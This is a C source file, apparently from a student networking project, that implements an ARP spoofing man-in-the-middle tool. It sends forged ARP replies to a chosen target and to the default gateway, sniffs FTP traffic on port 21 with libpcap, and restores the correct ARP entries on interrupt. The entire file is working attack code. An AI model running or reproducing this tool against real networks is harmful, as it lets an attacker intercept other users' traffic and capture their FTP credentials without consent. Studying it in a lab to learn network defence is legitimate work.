#include <ft_arp.h>

volatile sig_atomic_t g_running = true;
pcap_t  *g_handle = NULL;
struct  bpf_program g_fp;
char    *g_gateway_mac = NULL;
char    *g_gateway_ip = NULL;
char    *g_target_ip = NULL;
char    *g_target_mac = NULL;

void cleanup()
{

	t_arp_packet		correct_arp_packetto_gateway;
	t_arp_packet		correct_arp_packetto_target;


	memset(&correct_arp_packetto_gateway, 0, sizeof(t_arp_packet));
	memset(&correct_arp_packetto_target, 0, sizeof(t_arp_packet));
	fill_packet(&correct_arp_packetto_gateway, g_gateway_ip, g_gateway_mac, g_target_ip, g_target_mac);
	fill_packet(&correct_arp_packetto_target, g_target_ip, g_target_mac, g_gateway_ip, g_gateway_mac);

	 if (g_handle && g_gateway_ip && g_gateway_mac && g_target_ip && g_target_mac) {
        for (int i = 0; i < 5; i++) {
            pcap_send_packet(&correct_arp_packetto_gateway, g_handle);
			pcap_send_packet(&correct_arp_packetto_target, g_handle);
            
            sleep(1);
        }
    }
    
    if (g_handle) {
        pcap_freecode(&g_fp);
        pcap_close(g_handle);
        g_handle = NULL;
    }
    
    free(g_gateway_mac);
    free(g_gateway_ip);
}

void sigint_handler(int signum) 
{
	(void)signum;
	g_running = 0;
}

int main(int ac, char **av)
{
	char				*interface;
	char				errbuf[PCAP_ERRBUF_SIZE];
	int	packet_captured_count;
	char filter_exp[] = "port 21";
	struct bpf_program	fp;
    t_arp_packet		arp_packet_to_target;
	t_arp_packet		arp_packet_to_gateway;
	
	bpf_u_int32			net;

	interface = "eth0";
	net = 1;
	if (ac != 5){
		print_error("Please enter the Ip source, the Mac source, the target Ip source, The Mac source.\n -> Examples :192.168.10.45, aa.bb.cc.dd.ee.ff, 192.168.10.47, a0.b0.c0.d0.e0.f0\n");
	}
    
	if (signal(SIGINT, sigint_handler) == SIG_ERR) {
        printf("Error setting signal handler\n");
        return 1;
    }

	is_valid_ip_addr(av[1]);
	is_valid_ip_addr(av[3]);
	is_valid_mac_addr(av[2]);
	is_valid_mac_addr(av[4]);

	memset(&arp_packet_to_target, 0, sizeof(t_arp_packet));
	memset(&arp_packet_to_gateway, 0, sizeof(t_arp_packet));

	g_gateway_ip = get_default_gateway_ip(interface);
	if (g_gateway_ip == NULL )
	{
		return(-1);
	}
	g_gateway_mac = get_default_gateway_mac(g_gateway_ip);
	if (g_gateway_mac == NULL)
	{
		return (-1);
	}
	fill_packet(&arp_packet_to_target, g_gateway_ip, av[2], av[3], av[4]);
	fill_packet(&arp_packet_to_gateway, av[3], av[2], g_gateway_ip, g_gateway_mac);
	// print_packet_info(&arp_packet_to_target);
	// print_packet_info(&arp_packet_to_gateway);

	// dump_packet_hex(&arp_packet_to_target);
	// dump_packet_hex(&arp_packet_to_gateway);
	g_handle = pcap_open_live(interface,BUFSIZ, 1, 1000, errbuf);	
	if (g_handle == NULL)
	{
		fprintf(stderr, "Couldn't open device %s: %s\n", interface, errbuf);
		return(2);
	}
	if (pcap_compile(g_handle, &fp, filter_exp, 0, net) == -1)
	{
		fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(g_handle));
		return(2);

	}
	if (pcap_setfilter(g_handle, &fp) == -1) {
		fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(g_handle));
		return(2);
	}
	while (g_running)
	{
		pcap_send_packet(&arp_packet_to_target, g_handle);
		pcap_send_packet(&arp_packet_to_gateway, g_handle);
		packet_captured_count = pcap_dispatch(g_handle, -1, packet_handler, NULL);
		if (packet_captured_count == -1)
		{
			fprintf(stderr, "Error capturing packets: %s\n", pcap_geterr(g_handle));
		}
		sleep(2);
	}
	pcap_freecode(&fp);
	pcap_close(g_handle);
	free(g_gateway_mac);
	free(g_gateway_ip);
	return (0);
}
